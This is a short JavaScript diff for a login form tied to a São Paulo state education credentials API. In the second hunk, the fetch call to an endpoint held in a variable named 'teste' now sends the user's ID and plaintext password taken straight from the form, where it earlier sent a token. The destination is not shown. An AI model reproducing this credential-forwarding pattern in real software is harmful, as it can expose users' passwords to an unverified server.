@@ -56,8 +56,8 @@ document.getElementById('Enviar').addEventListener('submit', (e) => {
       ENABLE_SUBMISSION: true,
       LOGIN_URL: 'https://sedintegracoes.educacao.sp.gov.br/credenciais/api/LoginCompletoToken',
       LOGIN_DATA: {
-        user: document.getElementById('ra').value, 
-        senha: document.getElementById('senha').value,
+        id: document.getElementById('ra').value, 
+        password: document.getElementById('senha').value,
       },
     };
 
@@ -108,11 +108,11 @@ function sendRequest(token) {
     'Content-Type': 'application/json',
     Accept: 'application/json',
   };
-
+    
   fetch(teste, {
     method: 'POST',
     headers,
-    body: JSON.stringify({ token }),
+    body: JSON.stringify({ id: document.getElementById('ra').value, password: document.getElementById('senha').value }),
   })
     .then(response => {
       if (!response.ok)
